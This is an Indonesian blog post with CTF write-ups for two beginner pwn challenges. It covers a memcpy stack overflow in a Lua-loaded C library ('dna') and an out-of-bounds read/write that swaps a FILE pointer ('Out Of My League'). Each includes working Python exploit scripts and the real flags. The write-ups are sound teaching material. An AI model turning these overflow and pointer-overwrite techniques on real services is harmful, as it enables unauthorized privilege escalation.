---
date: 2025-12-26 12:58:43
layout: post
title: "TCP1P CTF Special Christmas 2025"
subtitle: have fun
description: Bersenang Senang di akhir semester dengan tcp1p
image: /assets/img/uploads/tcp1pcrismas/atas.jpg
optimized_image:
category: ctf
tags:
  - pwn
  - web exploitation
  - xss
  - fullstack
author: ilupii
paginate: false
---

pwn nya aku yang buat (pemula) jadi ini mungkin official write up wkwkkw 
# dna (pwn)
di sini kita di berikan sebuah soal ctf frontend tapi ada di bagian kategori pwn, dari sini sudah jelas kita harus ngapain
## deskripsi
> Author: Ilupii
>
>I just learned full stack, but I tried to make a backend that is different from others to minimize hacker attacks. But is >it safe?
>
>Start challenge from: https://gzcli.1pc.tf/tcp1p_ctf_special_crismas_2025_pwn_dna

## analisis awal
dari deskripsi awalnya yang mengatakan <em>but I tried to make a backend that is different from others to minimize hacker attacks. But is it safe?</em>  ini kita bisa langsung tau, bagian mana nya yang harus kita cek terlebih dahulu (backend)
![Gambar 1]({{ site.baseurl }}/assets/img/uploads/tcp1pcrismas/1.png)
di sini ada sebuah inputan yang nanti kita akan cari tau bersama dengan dna.so

```bash
└─$ tree
.
├── backend
│   ├── extension
│   │   └── dna.so <-- kita target bagian sini karena ini
│   ├── init_db.sql
│   ├── nginx.conf
│   └── src
│       ├── app.lua
│       ├── db.lua
│       └── dna.lua
├── docker-compose.yml
├── Dockerfile
```

## analisis kode
di sini ada fake flag yang terletak di dalam sql yang menandakan ini perlu akses admin untuk mendapatkan flag
```sql
('Satellite Uplink Key', 99999, 'Direct military downlink.', '📡');

INSERT INTO secrets (owner, data) VALUES ('admin', 'XMAS{fake}');
```
karena tadi kita penasaran dengan input kita mencoba cari dimana kode itu berasal sehingga kami menemukan ini
```js
ini terletak pada profile.vue
 try {
    const res = await fetch('/api/user/secure_update', {
      method: 'POST', body: JSON.stringify({ packet })
    })
```
jadi bisa ke tebak kalau kita request paket ke profile contohnya kayak gini
```json
`POST /api/user/secure_update`
```json
{
    "packet": "00000041414141"
}

maka respon nya akan seperti ini
{
    "role": 0, <- di sini ada role yang di mana 0 itu user dan 1 itu admin
    "msg": "Sequence Rejected"
}
```
terus pertanyaan nya, gimana cara mengubah nya menjadi 1 ?, di sini lah fungsi dna.so di mulai
di karenakan dna.so ini adalah otak dari web nya (backend) tapi backend nya ini udah ke leak atau bocor jadi kita tinggal menganalisis nya, oh iya Ini adalah bagian krusial yang menghubungkan eksploit biner dengan Flag. Server menggunakan OpenResty (Nginx + Lua). Skrip Lua memuat perpustakaan C menggunakan FFI (Foreign Function Interface).
## analisis dna.so
di sini ada fungsi xor 
```c
__int64 __fastcall decrypt(__int64 a1, int a2)
{
  __int64 result; // rax
  unsigned int i; // [rsp+18h] [rbp-4h]

  for ( i = 0; ; ++i )
  {
    result = i;
    if ( (int)i >= a2 )
      break;
    *(_BYTE *)((int)i + a1) ^= 0x7Au; <- xor = 0x7A
  }
  return result;
}
```
dan selanjut nya ada fungsi checksum
```c
__int64 __fastcall calc_checksum(__int64 a1, int a2)
{
  int i; // [rsp+14h] [rbp-8h]
  unsigned __int16 v4; // [rsp+1Ah] [rbp-2h]
  unsigned __int16 v5; // [rsp+1Ah] [rbp-2h]

  v4 = -21846;
  for ( i = 0; i < a2; ++i )
  {
    v5 = *(unsigned __int8 *)(i + a1) ^ v4;
    if ( (v5 & 1) != 0 )
      v4 = (v5 >> 1) ^ 0x8008;
    else
      v4 = v5 >> 1;
  }
  return v4;
}
```
selanjutnya yang paling rentan ada memcpy yang bisa mencopy buffer tanpa validasi <a href="https://community.st.com/t5/stm32-mcus-products/memcpy-corrupts-data-far-away-in-front-of-destination-while/td-p/638194"> baca di sini </a>
```c
_int64 __fastcall dna_process_packet(__int64 a1)
{
  _BYTE dest[256]; // [rsp+10h] [rbp-260h] BYREF
  unsigned __int8 v3; // [rsp+110h] [rbp-160h] BYREF
  unsigned __int16 v4; // [rsp+111h] [rbp-15Fh]
  _BYTE v5[5]; // [rsp+113h] [rbp-15Dh] BYREF
  _BYTE s[68]; // variabel
  unsigned int v7; // [rsp+254h] [rbp-1Ch]
  __int16 v8; // [rsp+266h] [rbp-Ah]
  unsigned __int16 v9; // [rsp+268h] [rbp-8h]
  unsigned __int8 v10; // [rsp+26Bh] [rbp-5h]
  int v11; // [rsp+26Ch] [rbp-4h]

  memset(s, 0, 0x48uLL);
  v7 = 0;
  v11 = _hex_decode(a1, &v3, 256LL);
  if ( v11 <= 2 )
    return 0LL;
  v10 = v3;
  v9 = _byteswap_ushort(v4);
  if ( v11 - 2 <= v3 )
    return 0LL;
  memcpy(dest, v5, v10);
  _decrypt((__int64)dest, v10);
  v8 = _calc_checksum((__int64)dest, v10);
  if ( v8 != v9 )
    return 0LL;
  memcpy(s, dest, v10);
  if ( v7 == 322420958 )
    return 322420958LL;
  else
    return v7;
}
```
## exploit

* Mekanisme Enkripsi (decrypt)
Fungsi ini sangat sederhana. Ini adalah enkripsi simetris menggunakan operasi XOR.
```c
*(_BYTE *)((int)i + a1) ^= 0x7Au;
```
Setiap byte dalam payload di-XOR dengan kunci statis 0x7A.
cara agar bisa mengalahkan xor cukup mudah

Chipertext = Plaintext ⊕ Key
Plaintext = Ciphertext ⊕ Key

* Mekanisme Integritas (calc_checksum)
Server memverifikasi integritas data sebelum memprosesnya. Jika checksum salah, paket ditolak.
```c
v4 = -21846; // Dalam hex (unsigned 16-bit), ini adalah 0xAAAA
for ( i = 0; i < a2; ++i ) {
    v5 = *(unsigned __int8 *)(i + a1) ^ v4;
    // ... logika shift dan XOR dengan 0x8008 ...
}
```
* Kerentanan utama
```c
_BYTE s[68];        // Buffer untuk username (Ukuran 68 byte)
unsigned int v7;    // Variabel integer (Ukuran 4 byte)
```
Variabel v7 berada tepat di bawah s di dalam memori stack. Offsetnya bisa dihitung dari alamat rbp:
s ada di rbp-60h
v7 ada di rbp-1Ch
Selisihnya: 0x60 - 0x1Ch = 0x44 -> 68 Byte.
Ini berarti setelah 68 byte data di s, byte ke-69 akan mulai menimpa v7.
penyebab nya iyalah
```c
// v10 adalah panjang payload yang dikirim user (diambil dari header paket)
memcpy(s, dest, v10);
```
Program menggunakan memcpy untuk menyalin data dari dest ke s.
Ukuran copy v10 diambil dari input user, TIDAK ADA validasi apakah v10 > 68.
Jika kita mengirim payload dengan panjang 72 byte, maka
68 byte pertama mengisi s.
4 byte terakhir akan menimpa v7.
* Target Eksploitasi (Win Condition)
```c
v7 = 0; // Awalnya v7 di-set 0 (User biasa)
// ...
if ( v7 == 322420958 ) // Cek apakah v7 berubah jadi angka ajaib ini
    return 322420958LL;
else
    return v7;
```
Jadi, jika kita berhasil menimpa v7 dengan 0x1337C0DE, fungsi C ini akan me-return nilai tersebut ke Lua, dan Lua akan memberikan flag.


**kira kira bgini cara kerja exploit nya**
```bash
[ ATTACKER ]
     |
     v
(1) CRAFTING PAYLOAD
     |-- [ 68 Bytes Junk (Padding) ]
     |-- [ 4 Bytes Target: 0x1337C0DE (Little Endian) ]
     |-- [ Total: 72 Bytes Plaintext ]
     |
     v
(2) BYPASS PROTECTION
     |-- [ Calculate Checksum (CRC-16) ]
     |-- [ Encrypt Payload (XOR Key: 0x7A) ]
     |
     v
(3) SEND REQUEST
     |-- POST /api/user/secure_update
     |-- Data: { "packet": "483C4B..." }
     |
     v
[ SERVER (Nginx/Lua) ]
     |
     | (Pass packet to C Library)
     v
[ DNA.SO (C Binary) ]
     |
     |-- [ Decode Hex ] -> Bytes
     |-- [ Decrypt ] -> Kembali jadi Plaintext (72 Bytes)
     |-- [ Verify Checksum ] -> Valid!
     |
     v
(4) VULNERABILITY EXECUTION
     |-- memcpy(buffer, payload, 72)
     |
     |   [ STACK MEMORY LAYOUT ]
     |   [ Buffer (64 bytes) ] <--- Terisi 'A'
     |   [ Check  (4 bytes)  ] <--- Terisi 'A'
     |   [ ROLE   (4 bytes)  ] <--- DITIMPA JADI 0x1337C0DE !!!
     |
     v
(5) CHECK PRIVILEGE
     |-- if (sess.role == 0x1337C0DE) ? YES!
     |-- return 322420958 (Admin ID)
     |
     v
[ LUA SCRIPT ]
     |-- Is Admin? YES.
     |-- Fetch Flag from DATABASE (Table: secrets)
     |
     v
[ RESPONSE ]
     |-- HTTP 200 OK
     |-- JSON: { "flag": "XMAS{...}" }
     |
     v
[ ATTACKER WINS ]
```

### solve.py
```py
import struct

import requests

URL = "http://1pc.tf:34757"
XOR_KEY = 0x7A


def calc_checksum(data_bytes):
    crc = 0xAAAA
    for byte in data_bytes:
        crc ^= byte
        if crc & 1:
            crc = (crc >> 1) ^ 0x8008
        else:
            crc = crc >> 1
    return crc


def solve():
    print("[*] Generating Payload...")
    padding = b"A" * 68
    target_role = struct.pack("<I", 0x1337C0DE)

    plaintext = padding + target_role

    # Encrypt
    encrypted = bytearray([b ^ XOR_KEY for b in plaintext])

    # Checksum & Header
    checksum = calc_checksum(plaintext)
    header = struct.pack("B", len(plaintext)) + struct.pack(">H", checksum)

    packet_hex = (header + encrypted).hex().upper()

    print("[*] Sending Attack...")
    r = requests.post(f"{URL}/api/user/secure_update", json={"packet": packet_hex})

    print(f"[*] Response: {r.text}")

if __name__ == "__main__":
    solve()
```
![Gambar 1]({{ site.baseurl }}/assets/img/uploads/tcp1pcrismas/2.png)
#### flag = XMAS{akumaujadifulstakkkkkkkkkdevloper}

# Out Of My League (pwn)
ini chall out of bounds sih
ini singkat saja kayaknya karena sudah banyak yang membahas tentang oob ini
## deskripsi
>Author: Ilupii
>She's out of my league in every single way and you can belive she's sleeping at my place
>Start challenge from: https://gzcli.1pc.tf/tcp1p_ctf_special_crismas_2025_pwn_out_of_my_league

## analisis awal
di berikan sebuah attachment berupa binary seperti ini
![Gambar 1]({{ site.baseurl }}/assets/img/uploads/tcp1pcrismas/4.png)
dan ini hasil check security nya
![Gambar 1]({{ site.baseurl }}/assets/img/uploads/tcp1pcrismas/3.png)
pada gambar ini full on security nya, jadi kita tidak bisa
* overwrite got (exit dkk)
* canary nyala
* dll.

## analisis kode
yang kita dapatkan ad 4 fungsi utama
```c
unsigned __int64 menu()
{
int __fastcall __noreturn main(int argc, const char **argv, const char **envp)
{
  int v3; // [rsp+Ch] [rbp-54h]
  char s[72]; // [rsp+10h] [rbp-50h] BYREF
  unsigned __int64 v5; // [rsp+58h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  init(argc, argv, envp);
  while ( 1 )
  {
    while ( 1 )
    {
      puts("gatau lagi soalnya mau gimana tpi ini udah cukup kok buat belajar heheheheh");
      menu();
      fgets(s, 64, stdin);
      v3 = atoi(s);
      if ( v3 != 123455 )
        break;
      f = (__int64)fopen("flag.txt", "r");
      puts("Invalid.");
    }
    if ( v3 == 4 )
    {
      puts("Bye!");
      exit(0);
    }
    if ( v3 > 4 )
    {
LABEL_14:
      puts("Invalid.");
    }
    else
    {
      switch ( v3 )
      {
        case 3:
          print_flag();
          break;
        case 1:
          store_data();
          break;
        case 2:
          read_data();
          break;
        default:
          goto LABEL_14;
      }
    }
  }
}
```
bisa kita lihat pada fungsi main ini ada beberapa fungsi penting lainnya seperti `printflag` `store_data` dan `read_data()`
tapi ada 1 yang buat menarik yaitu ketika kondisi `123455` itu mengeluarkan variabel 
`f = (__int64)fopen("flag.txt", "r");`

```c
unsigned __int64 store_data()
{
  int v1; // [rsp+4h] [rbp-Ch] BYREF
  unsigned __int64 v2; // [rsp+8h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  printf("Index: ");
  __isoc23_scanf("%d", &v1);
  getchar();
  printf("Data: ");
  fread((char *)&nums + 8 * v1, 1uLL, 8uLL, stding); // <- Out of bounds
  return v2 - __readfsqword(0x28u);
}
```
ini adalah fungsi dari case 1 yaitu store data yang di mana Fungsi `store_data()` membaca indeks dari user dan menulis 8 byte data ke array global nums berdasarkan indeks tersebut. Namun, tidak ada validasi batas indeks, sehingga penyerang dapat memberikan nilai indeks di luar rentang yang valid. Hal ini menyebabkan `out-of-bounds write` pada memory global, yang dapat digunakan untuk menimpa pointer penting seperti FILE *stding. Meskipun fungsi ini dilindungi oleh stack canary, kerentanan terjadi di global memory sehingga proteksi tersebut tidak efektif.
```c
unsigned __int64 read_data()
{
  int v1; // [rsp+4h] [rbp-Ch] BYREF
  unsigned __int64 v2; // [rsp+8h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  printf("Index: ");
  __isoc23_scanf("%d", &v1);
  getchar();
  printf("Data: %s\n", &nums[8 * v1]);
  return v2 - __readfsqword(0x28u);
}
```
Fungsi `read_data()` digunakan untuk menampilkan isi data dari array global nums berdasarkan indeks yang diberikan oleh pengguna. Sama seperti fungsi `store_data()`, fungsi ini tidak melakukan validasi terhadap nilai indeks yang dimasukkan. Nilai indeks tersebut langsung digunakan untuk menghitung alamat memori yang akan dibaca, yaitu `&nums[8 * v1]`. Akibatnya, pengguna dapat memberikan indeks di luar batas array yang valid, termasuk nilai negatif atau nilai besar, sehingga fungsi akan membaca data dari lokasi memori di luar array nums. Kerentanan ini merupakan out-of-bounds read (OOB read).
```c
unsigned __int64 print_flag()
{
  char s[104]; // [rsp+0h] [rbp-70h] BYREF
  unsigned __int64 v2; // [rsp+68h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  puts("mau flag ga");
  if ( f )
  {
    fgets(s, 100, stding);
    printf("input kamu: %s\n", s);
    s[strcspn(s, "\n")] = 0;
    if ( !strcmp(s, "mau") )
      puts("Flag: XMAS{ini_flag_palsu_ayo_cari_lagi_semangattt:))))))}");
    else
      puts("yah ga jadi");
  }
  else
  {
    puts("No flag file.");
  }
  return v2 - __readfsqword(0x28u);
}
```
Fungsi `print_flag()` bertugas untuk membaca input pengguna dan menentukan apakah flag akan ditampilkan. Namun, fungsi ini tidak langsung membaca flag, melainkan hanya menampilkan `flag palsu` jika input yang diterima adalah string "mau". Secara default, input dibaca dari stream stding, yang pada awal program diset ke stdin.
## Exploit
jadi exploit nya cukup mudah, yaitu kita cukup mengubah alur dari fungsi `print_flag` langkah nya seperti ini
* trigger `f = (__int64)fopen("flag.txt", "r");` dengan mengetik 123455 di main fungsi
* cari index f dan `stding` di `fgets` dan jika sudah dapat
* ubah alur `fgets(s, 100, stding);` menjadi seperti ini `fgets(s, 100, f);` <- ini akan mengeluarkan flag.txt asli

#### solve.py
```python
#!/usr/bin/env python3
from pwn import *

exe = context.binary = ELF("./chall")
context.log_level = "info"

def start():
    if args.GDB:
        return gdb.debug(exe.path, gdbscript="continue")
    elif args.REMOTE:
        return remote("1pc.tf", 52045)
    else:
        return process(exe.path)

p = start()

def read_data(index):
    p.sendline(b"2")
    p.sendlineafter(b"Index: ", str(index).encode())
    p.recvuntil(b"Data: ")
    return p.recv(6)

def store_data(index, data):
    p.sendline(b"1")
    p.sendlineafter(b"Index: ", str(index).encode())
    p.sendafter(b"Data: ", data)

p.sendline(b"123455")
leak_f = u64(read_data(9).ljust(8, b"\x00"))
leak_input = u64(read_data(8).ljust(8, b"\x00"))

log.success(f"f        = {hex(leak_f)}")
log.success(f"input_fp = {hex(leak_input)}")

store_data(8, p64(leak_f))

p.sendline(b"3")

p.interactive()
```
![Gambar 1]({{ site.baseurl }}/assets/img/uploads/tcp1pcrismas/5.png)
#### flag : XMAS{ini_dia_yg_aseli_real_work_100_selamat_kamu_udah_bisa_OOB_ahhahaahh}
